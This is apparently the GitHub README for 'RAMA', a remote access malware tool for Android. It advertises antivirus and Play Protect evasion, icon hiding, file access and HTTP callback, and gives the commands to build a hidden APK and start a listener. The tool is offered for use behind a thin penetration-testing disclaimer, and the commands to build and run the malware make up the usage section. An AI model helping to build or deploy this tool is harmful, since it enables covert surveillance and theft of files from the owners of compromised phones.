# RAMA : Remote Access Malware for Android

<p align="center">
    <img src="imgs/logo.png">
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0.0-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/Author-HuiHola-blue?style=for-the-badge">
</p>

## About
**RAMA is a malware tool for android penetration testing which can bypass android default antivirus and playprotect and can run on foreground it's a malware not payload malware created on java and server script created on nodejs and cli created on python.**


## terms and conditions
**Don't use this tool for any illegal activity If you do We will not be responsible for it If you agree with our terms and conditions go ahead and download and enjoy.**

## Features
* FUD
* Foreground Service
* Icon Hide
* Bypass playprotect
* Bypass default antivirus
* Files Access
* Http Service Connection
* Working on Android 8,9,10,11,12,13,14

## Tested

* Vivo (Android 8, Android 9, Android 10, Android 12, Android 13, Android 14)
* Realme (Android 11)
* Oneplus (Android 12, Android 13)
* Xiaomi (Android 9, Android 11, Android 12)

## Required Packages
```bash
sudo apt install python3
sudo apt install nodejs
sudo apt install apktool
sudo apt install openjdk-17-jdk
```

## Installation
```bash
git clone https://github.com/HuiHola/RAMA.git
cd RAMA
pip install -r requirements.txt
```

## Commands

### Build APK
* build autohide apk after installion
```bash
python rama.py -b --autohide true
```

* build simple apk 
``` bash 
python rama.py -b
```

after that prompt ask to **http** server url don't use ngrok it may throw error use serveo or other

### Start Listing
```bash 
python rama.py -l 8080
```
 http server port




